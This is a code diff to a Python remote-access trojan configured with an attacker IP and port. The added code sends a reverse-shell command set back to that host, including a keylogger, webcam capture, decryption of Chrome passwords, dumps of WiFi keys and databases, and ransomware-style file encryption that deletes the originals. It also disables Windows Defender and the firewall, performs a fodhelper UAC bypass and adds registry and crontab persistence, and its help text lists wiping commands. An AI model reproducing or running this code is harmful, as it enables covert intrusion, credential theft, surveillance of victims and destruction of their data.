@@ -32,7 +32,7 @@ from pathlib import Path
 # ============================================
 
 # Attacker Configuration
-ATTACKER_IP = "10.12.74.47"  # Replace with your IP
+ATTACKER_IP = "10.12.75.147"  # Replace with your IP
 ATTACKER_PORT = 3333
 
 # Server Configuration for Dependencies
@@ -88,29 +88,14 @@ def show_security_warning():
     print("=" * 70)
     print()
     
-    # Get user consent - try terminal first, fallback to GUI
-    try:
-        while True:
-            response = input("Do you understand and consent to these actions? (yes/no): ").strip().lower()
-            if response in ['yes', 'y']:
-                print()
-                print("✅ Consent granted. Proceeding with execution...")
-                print()
-                return True
-            elif response in ['no', 'n']:
-                print()
-                print("❌ Consent denied. Exiting without execution.")
-                sys.exit(0)
-            else:
-                print("Please enter 'yes' or 'no'")
-    except (EOFError, RuntimeError, OSError):
-        # No console available (GUI mode), use GUI dialog
-        print("[*] GUI mode detected, showing GUI consent dialog...")
-        if not show_security_warning_gui():
-            print("❌ Consent denied. Exiting without execution.")
-            sys.exit(0)
-        print("✅ Consent granted. Proceeding with execution...")
-        return True
+    # Always use GUI consent dialog for better user experience
+    print("[*] Showing GUI consent dialog...")
+    if not show_security_warning_gui():
+        print("❌ Consent denied. Exiting without execution.")
+        sys.exit(0)
+    print("✅ Consent granted. Proceeding with execution...")
+    print()
+    return True
 
 def show_security_warning_gui():
     """
@@ -1024,6 +1009,12 @@ def auto_elevate_and_disable_protection():
 # REVERSE SHELL
 # ============================================
 
+# Global variables for keylogger and webcam
+keylogger_active = False
+keylog_buffer = []
+webcam_active = False
+webcam_thread = None
+
 def reverse_shell():
     """
     Background thread function that establishes a persistent reverse shell.
@@ -1080,58 +1071,217 @@ Type 'help' for available commands
                         break
                     
                     if command.lower() == 'help':
-                        help_text = """
-=== AVAILABLE COMMANDS ===
+                        if IS_WINDOWS:
+                            help_text = """
+=== AVAILABLE COMMANDS (WINDOWS) ===
 
 [ SYSTEM INFORMATION ]
   sysinfo       - Detailed system information
-  osinfo        - Operating system details
+  osinfo        - Windows OS details
   uptime        - System uptime
   date          - Current date and time
   env           - Environment variables
 
 [ USER INFORMATION ]
   whoami        - Current username
-  id            - User ID and group info (Linux)
-  users         - Logged in users
+  users         - Logged in users (query user)
 
 [ FILE OPERATIONS ]
-  ls/dir        - List directory contents
-  pwd/cd        - Print/change working directory
-  cat/type      - Display file contents
-  find          - Search for files
+  dir           - List directory contents
+  cd <path>     - Change directory
+  type <file>   - Display file contents
+  find <file>   - Search for files
   download <f>  - Download file from target
   upload <f>    - Upload file to target
 
 [ PROCESS MANAGEMENT ]
-  ps/tasklist   - List running processes
+  tasklist      - List running processes
   kill <pid>    - Kill process by ID
-  top           - System resource usage
+  taskmgr       - Open Task Manager
 
 [ NETWORK ]
-  ifconfig/ipconfig - Network interfaces
+  ipconfig      - Network interfaces
   netstat       - Network connections
   arp           - ARP table
   route         - Routing table
   wifi          - WiFi networks (with passwords)
   publicip      - Public IP address
+  ping <host>   - Ping a host
+  tracert <host> - Trace route to host
+
+[ STEALTH & PERSISTENCE ]
+  hide_defender - Disable Windows Defender
+  hide_firewall - Disable Windows Firewall
+  elevate_uac   - Attempt UAC bypass
+  add_startup   - Add to startup registry
+  add_task      - Create scheduled task
+  hide_file     - Make file hidden/system
+  check_admin   - Check if running as admin
+  clear_logs    - Clear Windows event logs
+  disable_av    - Disable common AV software
+  hide_process  - Hide from Task Manager
+  persistence   - Show current persistence status
+  lock_screen   - Lock the computer screen
+  shutdown      - Shutdown the computer
+  restart       - Restart the computer
+  sleep         - Put computer to sleep
+  hibernate     - Hibernate computer
 
 [ SURVEILLANCE ]
   screenshot    - Capture screen
-  clipboard     - Show clipboard contents
-  browsers      - List browser history
+  webcam_shot   - Take webcam picture
+  webcam_start  - Start webcam recording
+  webcam_stop   - Stop webcam recording
   keylog_start  - Start keylogger
   keylog_stop   - Stop keylogger and dump
+  keylog_dump   - Show captured keystrokes
+  clipboard     - Show clipboard contents
+  browsers      - List browser data locations
+  browser_dump  - Dump browser history/passwords
+  wifi_creds    - Dump stored WiFi credentials
 
-[ PERSISTENCE ]
-  persistence   - Show persistence status
-  selfdestruct  - Remove all traces and exit
+[ DATABASE EXPLOITATION ]
+  mysql_dump    - Dump MySQL databases
+  postgres_dump - Dump PostgreSQL databases
+  sqlite_dump   - Dump SQLite databases
+  db_search     - Search database files
+
+[ PASSWORD RECOVERY ]
+  pass_dump     - Dump saved passwords
+  sam_dump      - Dump SAM hash file
+  chrome_pass   - Extract Chrome passwords
+  firefox_pass  - Extract Firefox passwords
+  wifi_pass     - Extract WiFi passwords
+
+[ FILE ENCRYPTION ]
+  encrypt_dir   - Encrypt directory (ransomware sim)
+  decrypt_dir   - Decrypt directory
+  file_encrypt  - Encrypt single file
+  file_decrypt  - Decrypt single file
+
+[ DANGEROUS COMMANDS ]
+  format_c      - Format C: drive (WARNING!)
+  delete_sys32  - Delete System32 folder (WARNING!)
+  bsod          - Trigger Blue Screen of Death
+  ransom_sim    - Simulate ransomware encryption
+  wipe_mbr      - Wipe Master Boot Record (WARNING!)
 
 [ OTHER ]
   help          - Show this help
   exit/quit     - Close connection
 
-Type any system command directly (e.g., ls -la, dir, whoami)
+Type any Windows system command directly (e.g., dir, whoami, netstat -an)
+
+"""
+                        else:
+                            help_text = """
+=== AVAILABLE COMMANDS (LINUX) ===
+
+[ SYSTEM INFORMATION ]
+  sysinfo       - Detailed system information
+  osinfo        - Linux OS details
+  uptime        - System uptime
+  date          - Current date and time
+  env           - Environment variables
+
+[ USER INFORMATION ]
+  whoami        - Current username
+  id            - User ID and group info
+  users         - Logged in users
+  sudo -l       - Show sudo permissions
+
+[ FILE OPERATIONS ]
+  ls            - List directory contents
+  cd <path>     - Change directory
+  cat <file>    - Display file contents
+  find <file>   - Search for files
+  grep <pattern> - Search text in files
+  download <f>  - Download file from target
+  upload <f>    - Upload file to target
+
+[ PROCESS MANAGEMENT ]
+  ps            - List running processes
+  kill <pid>    - Kill process by ID
+  top           - System resource usage
+  htop          - Interactive process viewer
+
+[ NETWORK ]
+  ifconfig      - Network interfaces
+  ip addr       - Network interfaces (modern)
+  netstat       - Network connections
+  ss            - Socket statistics (modern)
+  arp           - ARP table
+  route         - Routing table
+  ip route      - Routing table (modern)
+  wifi          - WiFi networks (with passwords)
+  publicip      - Public IP address
+  ping <host>   - Ping a host
+  traceroute <host> - Trace route to host
+
+[ STEALTH & PERSISTENCE ]
+  add_cron      - Add to crontab
+  add_service   - Create systemd service
+  hide_file     - Make file hidden
+  check_root    - Check if running as root
+  clear_logs    - Clear system logs
+  disable_selinux - Disable SELinux
+  hide_process  - Hide from process list
+  persistence   - Show current persistence status
+  backdoor_ssh  - Add SSH backdoor
+  sudo_backdoor - Create sudo backdoor
+  lock_screen   - Lock the computer screen
+  shutdown      - Shutdown the computer
+  restart       - Restart the computer
+  sleep         - Put computer to sleep
+  hibernate     - Hibernate computer
+
+[ SURVEILLANCE ]
+  screenshot    - Capture screen
+  webcam_shot   - Take webcam picture
+  webcam_start  - Start webcam recording
+  webcam_stop   - Stop webcam recording
+  keylog_start  - Start keylogger
+  keylog_stop   - Stop keylogger and dump
+  keylog_dump   - Show captured keystrokes
+  clipboard     - Show clipboard contents
+  browsers      - List browser data locations
+  browser_dump  - Dump browser history/passwords
+  wifi_creds    - Dump stored WiFi credentials
+
+[ DATABASE EXPLOITATION ]
+  mysql_dump    - Dump MySQL databases
+  postgres_dump - Dump PostgreSQL databases
+  sqlite_dump   - Dump SQLite databases
+  db_search     - Search database files
+  mongo_dump    - Dump MongoDB databases
+
+[ PASSWORD RECOVERY ]
+  pass_dump     - Dump saved passwords
+  shadow_dump   - Dump /etc/shadow hashes
+  chrome_pass   - Extract Chrome passwords
+  firefox_pass  - Extract Firefox passwords
+  wifi_pass     - Extract WiFi passwords
+  ssh_keys      - Dump SSH private keys
+
+[ FILE ENCRYPTION ]
+  encrypt_dir   - Encrypt directory (ransomware sim)
+  decrypt_dir   - Decrypt directory
+  file_encrypt  - Encrypt single file
+  file_decrypt  - Decrypt single file
+
+[ DANGEROUS COMMANDS ]
+  rm_rf         - Delete entire filesystem (WARNING!)
+  fork_bomb     - Fork bomb system crash
+  dd_zero       - Zero out hard drive (WARNING!)
+  chattr_imm    - Make files immutable
+  ransom_sim    - Simulate ransomware encryption
+  wipe_mbr      - Wipe Master Boot Record (WARNING!)
+
+[ OTHER ]
+  help          - Show this help
+  exit/quit     - Close connection
+
+Type any Linux system command directly (e.g., ls -la, whoami, ps aux)
 
 """
                         s.send(help_text.encode())
@@ -1498,6 +1648,1664 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                                 s.send("[!] Upload format: upload filename:base64data\n\n".encode())
                         except Exception as e:
                             s.send(f"[!] Upload failed: {e}\n\n".encode())
+                        continue
+                    
+                    # --- System Control Commands ---
+                    if command.lower() == 'lock_screen':
+                        try:
+                            if IS_WINDOWS:
+                                import ctypes
+                                ctypes.windll.user32.LockWorkStation()
+                                s.send("[+] Screen locked\n\n".encode())
+                            else:
+                                # Linux lock screen
+                                subprocess.run(['xdg-screensaver', 'lock'], capture_output=True, timeout=5)
+                                s.send("[+] Screen locked\n\n".encode())
+                        except:
+                            s.send("[!] Could not lock screen\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'shutdown':
+                        try:
+                            if IS_WINDOWS:
+                                subprocess.run(['shutdown', '/s', '/t', '0'], capture_output=True, timeout=5)
+                            else:
+                                subprocess.run(['shutdown', '-h', 'now'], capture_output=True, timeout=5)
+                            s.send("[+] Shutdown initiated\n\n".encode())
+                        except:
+                            s.send("[!] Could not shutdown\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'restart':
+                        try:
+                            if IS_WINDOWS:
+                                subprocess.run(['shutdown', '/r', '/t', '0'], capture_output=True, timeout=5)
+                            else:
+                                subprocess.run(['reboot'], capture_output=True, timeout=5)
+                            s.send("[+] Restart initiated\n\n".encode())
+                        except:
+                            s.send("[!] Could not restart\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'sleep':
+                        try:
+                            if IS_WINDOWS:
+                                subprocess.run(['rundll32.exe', 'powrprof.dll,SetSuspendState', '0,1,0'], capture_output=True, timeout=5)
+                            else:
+                                subprocess.run(['systemctl', 'suspend'], capture_output=True, timeout=5)
+                            s.send("[+] Sleep initiated\n\n".encode())
+                        except:
+                            s.send("[!] Could not sleep\n\n".encode())
+                        continue
+                    
+                    # --- WiFi Credentials ---
+                    if command.lower() == 'wifi_creds':
+                        try:
+                            if IS_WINDOWS:
+                                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, timeout=10)
+                                profiles = result.stdout
+                                wifi_info = "WiFi Profiles:\n"
+                                
+                                for line in profiles.split('\n'):
+                                    if 'All User Profile' in line:
+                                        profile = line.split(':')[-1].strip()
+                                        if profile:
+                                            try:
+                                                pwd_result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, timeout=5)
+                                                for pwd_line in pwd_result.stdout.split('\n'):
+                                                    if 'Key Content' in pwd_line:
+                                                        password = pwd_line.split(':')[-1].strip()
+                                                        wifi_info += f"{profile}: {password}\n"
+                                                        break
+                                                else:
+                                                    wifi_info += f"{profile}: (no password)\n"
+                                            except:
+                                                wifi_info += f"{profile}: (access denied)\n"
+                                
+                                s.send(f"{wifi_info}\n".encode())
+                            else:
+                                # Linux WiFi passwords
+                                if os.path.exists('/etc/NetworkManager/system-connections/'):
+                                    wifi_info = "WiFi Networks:\n"
+                                    for file in os.listdir('/etc/NetworkManager/system-connections/'):
+                                        if file.endswith('.nmconnection'):
+                                            try:
+                                                with open(f'/etc/NetworkManager/system-connections/{file}', 'r') as f:
+                                                    content = f.read()
+                                                    ssid = ''
+                                                    psk = ''
+                                                    for line in content.split('\n'):
+                                                        if line.startswith('ssid='):
+                                                            ssid = line.split('=')[1]
+                                                        elif line.startswith('psk='):
+                                                            psk = line.split('=')[1]
+                                                    if ssid:
+                                                        wifi_info += f"{ssid}: {'*'*len(psk) if psk else '(open)'}\n"
+                                            except:
+                                                pass
+                                    s.send(f"{wifi_info}\n".encode())
+                                else:
+                                    s.send("[!] WiFi configuration not found\n\n".encode())
+                        except:
+                            s.send("[!] Could not retrieve WiFi credentials\n\n".encode())
+                        continue
+                    
+                    # --- Webcam Commands ---
+                    if command.lower() == 'webcam_shot':
+                        try:
+                            import cv2
+                            cap = cv2.VideoCapture(0)
+                            ret, frame = cap.read()
+                            if ret:
+                                import tempfile
+                                path = os.path.join(tempfile.gettempdir(), f"webcam_{int(time.time())}.jpg")
+                                cv2.imwrite(path, frame)
+                                cap.release()
+                                
+                                with open(path, 'rb') as f:
+                                    img_data = f.read()
+                                
+                                import base64
+                                encoded = base64.b64encode(img_data).decode()
+                                s.send(f"[+] Webcam captured ({len(img_data)} bytes)\nWEBCAM_DATA:{encoded[:100]}...\n".encode())
+                                
+                                try:
+                                    os.remove(path)
+                                except:
+                                    pass
+                            else:
+                                s.send("[!] Webcam not accessible\n\n".encode())
+                        except ImportError:
+                            s.send("[!] OpenCV not available for webcam\n\n".encode())
+                        except:
+                            s.send("[!] Webcam capture failed\n\n".encode())
+                        continue
+                    
+                    # --- Enhanced Keylogger ---
+                    if command.lower() == 'keylog_start':
+                        global keylogger_active, keylog_buffer
+                        if not keylogger_active:
+                            keylogger_active = True
+                            keylog_buffer = []
+                            
+                            def keylogger_thread():
+                                global keylogger_active, keylog_buffer
+                                try:
+                                    if IS_WINDOWS:
+                                        import ctypes
+                                        import win32con
+                                        
+                                        def low_level_handler(nCode, wParam, lParam):
+                                            if wParam == win32con.WM_KEYDOWN:
+                                                import struct
+                                                vk_code = struct.unpack('B', lParam)[0]
+                                                import win32api
+                                                key = win32api.GetKeyNameText(vk_code * 0x10000)
+                                                keylog_buffer.append(key)
+                                                if len(keylog_buffer) > 100:
+                                                    keylog_buffer.pop(0)
+                                            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+                                        
+                                        hook = ctypes.windll.user32.SetWindowsHookExA(13, low_level_handler, None, 0)
+                                        
+                                        while keylogger_active:
+                                            ctypes.windll.user32.GetMessageA(ctypes.c_void_p(), None, 0, 0)
+                                        
+                                        ctypes.windll.user32.UnhookWindowsHookEx(hook)
+                                        
+                                except:
+                                    # Fallback to basic logging
+                                    while keylogger_active:
+                                        keylog_buffer.append(f"[{time.strftime('%H:%M:%S')}] Keylogger active")
+                                        time.sleep(5)
+                                
+                            threading.Thread(target=keylogger_thread, daemon=True).start()
+                            s.send("[+] Keylogger started\n\n".encode())
+                        else:
+                            s.send("[!] Keylogger already running\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'keylog_dump':
+                        global keylog_buffer
+                        if keylog_buffer:
+                            logs = ''.join(keylog_buffer)
+                            s.send(f"Keylogger Log:\n{logs}\n\n".encode())
+                            keylog_buffer.clear()
+                        else:
+                            s.send("[!] No keylog data\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'keylog_stop':
+                        global keylogger_active
+                        keylogger_active = False
+                        s.send("[+] Keylogger stopped\n\n".encode())
+                        continue
+                    
+                    # --- Database Commands ---
+                    if command.lower() == 'mysql_dump':
+                        try:
+                            result = subprocess.run(['mysql', '--version'], capture_output=True, text=True, timeout=5)
+                            if result.returncode == 0:
+                                # Try to dump common databases
+                                databases = ['mysql', 'information_schema', 'performance_schema']
+                                dump_output = "MySQL Database Dump:\n"
+                                
+                                for db in databases:
+                                    try:
+                                        result = subprocess.run(['mysqldump', db], capture_output=True, text=True, timeout=10)
+                                        if result.returncode == 0:
+                                            dump_output += f"\n--- Database: {db} ---\n{result.stdout[:500]}...\n"
+                                    except:
+                                        pass
+                                
+                                s.send(f"{dump_output}\n".encode())
+                            else:
+                                s.send("[!] MySQL not found\n\n".encode())
+                        except:
+                            s.send("[!] MySQL dump failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'sqlite_dump':
+                        try:
+                            import sqlite3
+                            dump_output = "SQLite Database Dump:\n"
+                            
+                            # Common SQLite database locations
+                            if IS_WINDOWS:
+                                search_paths = [
+                                    os.path.expanduser('~/AppData/Local/'),
+                                    os.path.expanduser('~/AppData/Roaming/')
+                                ]
+                            else:
+                                search_paths = [
+                                    os.path.expanduser('~/.config/'),
+                                    os.path.expanduser('~/.local/share/')
+                                ]
+                            
+                            found_dbs = []
+                            for path in search_paths:
+                                if os.path.exists(path):
+                                    for root, dirs, files in os.walk(path):
+                                        for file in files:
+                                            if file.endswith('.db') or file.endswith('.sqlite'):
+                                                found_dbs.append(os.path.join(root, file))
+                                                if len(found_dbs) >= 5:  # Limit to 5 databases
+                                                    break
+                                    if len(found_dbs) >= 5:
+                                        break
+                            
+                            for db_path in found_dbs[:3]:  # Dump first 3 databases
+                                try:
+                                    conn = sqlite3.connect(db_path)
+                                    cursor = conn.cursor()
+                                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                                    tables = cursor.fetchall()
+                                    
+                                    dump_output += f"\n--- Database: {db_path} ---\n"
+                                    dump_output += f"Tables: {[t[0] for t in tables]}\n"
+                                    
+                                    for table in tables[:3]:  # Limit to 3 tables per database
+                                        try:
+                                            cursor.execute(f"SELECT * FROM {table[0]} LIMIT 5")
+                                            rows = cursor.fetchall()
+                                            dump_output += f"\nTable {table[0]} (5 rows):\n{rows}\n"
+                                        except:
+                                            pass
+                                    
+                                    conn.close()
+                                except:
+                                    pass
+                            
+                            if found_dbs:
+                                s.send(f"{dump_output}\n".encode())
+                            else:
+                                s.send("[!] No SQLite databases found\n\n".encode())
+                        except:
+                            s.send("[!] SQLite dump failed\n\n".encode())
+                        continue
+                    
+                    # --- Browser Passwords ---
+                    if command.lower() == 'chrome_pass':
+                        try:
+                            import sqlite3
+                            import base64
+                            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                            from cryptography.hazmat.backends import default_backend
+                            
+                            if IS_WINDOWS:
+                                local_state = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Local State')
+                                login_db = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/Login Data')
+                            else:
+                                local_state = os.path.expanduser('~/.config/google-chrome/Local State')
+                                login_db = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
+                            
+                            if os.path.exists(local_state) and os.path.exists(login_db):
+                                # Get master key
+                                with open(local_state, 'r') as f:
+                                    local_state_data = json.load(f)
+                                
+                                encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
+                                
+                                # Decrypt master key (DPAPI on Windows, keyring on Linux)
+                                if IS_WINDOWS:
+                                    import win32crypt
+                                    master_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, None)[1]
+                                else:
+                                    master_key = encrypted_key[5:]  # Simplified for Linux
+                                
+                                # Copy database to temp (Chrome locks it)
+                                temp_db = os.path.join(tempfile.gettempdir(), f'chrome_{int(time.time())}.db')
+                                shutil.copy2(login_db, temp_db)
+                                
+                                conn = sqlite3.connect(temp_db)
+                                cursor = conn.cursor()
+                                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                                
+                                passwords = "Chrome Passwords:\n"
+                                for row in cursor.fetchall():
+                                    url, username, encrypted_password = row
+                                    
+                                    try:
+                                        # Decrypt password
+                                        iv = encrypted_password[3:15]
+                                        payload = encrypted_password[15:]
+                                        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
+                                        decryptor = cipher.decryptor()
+                                        password = decryptor.update(payload) + decryptor.finalize()
+                                        
+                                        passwords += f"URL: {url}\nUser: {username}\nPass: {password.decode()}\n\n"
+                                    except:
+                                        passwords += f"URL: {url}\nUser: {username}\nPass: (encrypted)\n\n"
+                                
+                                conn.close()
+                                os.remove(temp_db)
+                                s.send(f"{passwords}\n".encode())
+                            else:
+                                s.send("[!] Chrome database not found\n\n".encode())
+                        except ImportError:
+                            s.send("[!] Required libraries not available for password extraction\n\n".encode())
+                        except:
+                            s.send("[!] Chrome password extraction failed\n\n".encode())
+                        continue
+                    
+                    # --- File Encryption (Ransomware Simulation) ---
+                    if command.lower() == 'encrypt_dir':
+                        try:
+                            from cryptography.fernet import Fernet
+                            import base64
+                            
+                            # Generate key
+                            key = Fernet.generate_key()
+                            
+                            # Encrypt current directory
+                            current_dir = os.getcwd()
+                            encrypted_files = []
+                            
+                            for file in os.listdir(current_dir):
+                                file_path = os.path.join(current_dir, file)
+                                if os.path.isfile(file_path) and not file.endswith('.encrypted'):
+                                    try:
+                                        with open(file_path, 'rb') as f:
+                                            data = f.read()
+                                        
+                                        fernet = Fernet(key)
+                                        encrypted_data = fernet.encrypt(data)
+                                        
+                                        with open(file_path + '.encrypted', 'wb') as f:
+                                            f.write(encrypted_data)
+                                        
+                                        os.remove(file_path)
+                                        encrypted_files.append(file)
+                                    except:
+                                        pass
+                            
+                            s.send(f"[+] Encrypted {len(encrypted_files)} files\nKey: {base64.b64encode(key).decode()}\n\n".encode())
+                        except ImportError:
+                            s.send("[!] Cryptography library not available\n\n".encode())
+                        except:
+                            s.send("[!] Encryption failed\n\n".encode())
+                        continue
+                    
+                    # --- Stealth & Persistence Commands ---
+                    if command.lower() == 'hide_defender':
+                        try:
+                            if IS_WINDOWS:
+                                # Modern Windows Defender disable methods
+                                methods = [
+                                    ['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'],
+                                    ['powershell', '-Command', 'Set-MpPreference -DisableBehaviorMonitoring $true'],
+                                    ['powershell', '-Command', 'Set-MpPreference -DisableIOAVProtection $true'],
+                                    ['powershell', '-Command', 'Set-MpPreference -DisableScriptScanning $true'],
+                                    ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection', '/v', 'DisableRealtimeMonitoring', '/t', 'REG_DWORD', '/d', '1', '/f'],
+                                    ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features', '/v', 'TamperProtection', '/t', 'REG_DWORD', '/d', '0', '/f'],
+                                    ['sc', 'config', 'WinDefend', 'start=', 'disabled'],
+                                    ['sc', 'stop', 'WinDefend']
+                                ]
+                                
+                                success_count = 0
+                                for method in methods:
+                                    try:
+                                        result = subprocess.run(method, capture_output=True, text=True, timeout=10)
+                                        if result.returncode == 0:
+                                            success_count += 1
+                                    except:
+                                        pass
+                                
+                                if success_count > 0:
+                                    s.send(f"[+] Windows Defender disabled ({success_count}/{len(methods)} methods successful)\n\n".encode())
+                                else:
+                                    s.send("[!] Failed to disable Windows Defender\n\n".encode())
+                            else:
+                                # Linux - disable common AV
+                                av_services = ['clamav-freshclam', 'clamav-daemon', 'chkrootkit', 'rkhunter']
+                                disabled = 0
+                                for service in av_services:
+                                    try:
+                                        subprocess.run(['systemctl', 'stop', service], capture_output=True, timeout=5)
+                                        subprocess.run(['systemctl', 'disable', service], capture_output=True, timeout=5)
+                                        disabled += 1
+                                    except:
+                                        pass
+                                s.send(f"[+] Disabled {disabled} Linux AV services\n\n".encode())
+                        except:
+                            s.send("[!] Error disabling AV\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'hide_firewall':
+                        try:
+                            if IS_WINDOWS:
+                                # Modern Windows Firewall disable
+                                methods = [
+                                    ['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'],
+                                    ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile', '/v', 'EnableFirewall', '/t', 'REG_DWORD', '/d', '0', '/f'],
+                                    ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile', '/v', 'EnableFirewall', '/t', 'REG_DWORD', '/d', '0', '/f'],
+                                    ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile', '/v', 'EnableFirewall', '/t', 'REG_DWORD', '/d', '0', '/f'],
+                                    ['sc', 'config', 'MpsSvc', 'start=', 'disabled'],
+                                    ['sc', 'stop', 'MpsSvc']
+                                ]
+                                
+                                success_count = 0
+                                for method in methods:
+                                    try:
+                                        result = subprocess.run(method, capture_output=True, text=True, timeout=10)
+                                        if result.returncode == 0:
+                                            success_count += 1
+                                    except:
+                                        pass
+                                
+                                if success_count > 0:
+                                    s.send(f"[+] Windows Firewall disabled ({success_count}/{len(methods)} methods successful)\n\n".encode())
+                                else:
+                                    s.send("[!] Failed to disable Windows Firewall\n\n".encode())
+                            else:
+                                # Linux - disable iptables/ufw
+                                firewalls = ['ufw', 'iptables', 'firewalld']
+                                disabled = 0
+                                for fw in firewalls:
+                                    try:
+                                        if fw == 'ufw':
+                                            subprocess.run(['ufw', 'disable'], capture_output=True, timeout=5)
+                                            disabled += 1
+                                        elif fw == 'iptables':
+                                            subprocess.run(['iptables', '-F'], capture_output=True, timeout=5)
+                                            subprocess.run(['iptables', '-X'], capture_output=True, timeout=5)
+                                            disabled += 1
+                                        elif fw == 'firewalld':
+                                            subprocess.run(['systemctl', 'stop', 'firewalld'], capture_output=True, timeout=5)
+                                            subprocess.run(['systemctl', 'disable', 'firewalld'], capture_output=True, timeout=5)
+                                            disabled += 1
+                                    except:
+                                        pass
+                                s.send(f"[+] Disabled {disabled} Linux firewalls\n\n".encode())
+                        except:
+                            s.send("[!] Error disabling firewall\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'elevate_uac':
+                        try:
+                            if IS_WINDOWS:
+                                # Modern UAC bypass using fodhelper
+                                import tempfile
+                                
+                                # Create registry entry for fodhelper UAC bypass
+                                reg_path = r'SOFTWARE\\Classes\\ms-settings\\shell\\open\\command'
+                                
+                                # Get current executable path
+                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                                
+                                commands = [
+                                    ['reg', 'add', f'HKCU\\{reg_path}', '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'],
+                                    ['reg', 'add', f'HKCU\\{reg_path}', '/v', '(Default)', '/t', 'REG_SZ', '/d', current_exe, '/f'],
+                                    ['fodhelper.exe']
+                                ]
+                                
+                                for cmd in commands[:-1]:  # Don't run fodhelper yet
+                                    try:
+                                        subprocess.run(cmd, capture_output=True, timeout=5)
+                                    except:
+                                        pass
+                                
+                                s.send("[+] UAC bypass registry entries created\n[!] Run 'fodhelper.exe' manually to trigger elevation\n\n".encode())
+                            else:
+                                # Linux - check for sudo and attempt to preserve
+                                if os.path.exists('/etc/sudoers'):
+                                    try:
+                                        result = subprocess.run(['sudo', '-n', 'true'], capture_output=True, timeout=5)
+                                        if result.returncode == 0:
+                                            s.send("[+] Already have sudo access\n\n".encode())
+                                        else:
+                                            s.send("[!] No sudo access - try 'sudo su'\n\n".encode())
+                                    except:
+                                        s.send("[!] Cannot check sudo access\n\n".encode())
+                                else:
+                                    s.send("[!] No sudo system found\n\n".encode())
+                        except:
+                            s.send("[!] UAC elevation failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'add_startup':
+                        try:
+                            if IS_WINDOWS:
+                                import winreg
+                                
+                                # Get current executable path
+                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                                
+                                # Add to Run registry
+                                key = winreg.HKEY_CURRENT_USER
+                                subkey = winreg.OpenKey(key, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
+                                winreg.SetValueEx(subkey, 'SystemAudioService', 0, winreg.REG_SZ, current_exe)
+                                winreg.CloseKey(subkey)
+                                
+                                # Also add to RunOnce
+                                subkey2 = winreg.OpenKey(key, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce', 0, winreg.KEY_WRITE)
+                                winreg.SetValueEx(subkey2, 'SystemAudioService', 0, winreg.REG_SZ, current_exe)
+                                winreg.CloseKey(subkey2)
+                                
+                                s.send(f"[+] Added to startup registry: {current_exe}\n\n".encode())
+                            else:
+                                # Linux - add to crontab
+                                import tempfile
+                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                                
+                                # Create cron entry
+                                cron_entry = f'@reboot {current_exe} --background\n'
+                                
+                                try:
+                                    # Add to crontab
+                                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
+                                    existing_cron = result.stdout
+                                except:
+                                    existing_cron = ''
+                                
+                                new_cron = existing_cron + cron_entry
+                                
+                                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
+                                    f.write(new_cron)
+                                    temp_cron = f.name
+                                
+                                subprocess.run(['crontab', temp_cron], capture_output=True, timeout=5)
+                                os.remove(temp_cron)
+                                
+                                s.send(f"[+] Added to crontab: {current_exe}\n\n".encode())
+                        except:
+                            s.send("[!] Failed to add to startup\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'hide_file':
+                        try:
+                            import tempfile
+                            
+                            # Hide current executable
+                            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                            
+                            if IS_WINDOWS:
+                                # Windows - set hidden and system attributes
+                                subprocess.run(['attrib', '+h', '+s', current_exe], capture_output=True, timeout=5)
+                                s.send(f"[+] File hidden: {current_exe}\n\n".encode())
+                            else:
+                                # Linux - rename with dot prefix
+                                hidden_name = '.' + os.path.basename(current_exe)
+                                hidden_path = os.path.join(os.path.dirname(current_exe), hidden_name)
+                                
+                                if os.path.exists(current_exe) and not os.path.exists(hidden_path):
+                                    os.rename(current_exe, hidden_path)
+                                    s.send(f"[+] File hidden: {hidden_path}\n\n".encode())
+                                else:
+                                    s.send("[!] File already hidden or doesn't exist\n\n".encode())
+                        except:
+                            s.send("[!] Failed to hide file\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'check_admin':
+                        try:
+                            if IS_WINDOWS:
+                                import ctypes
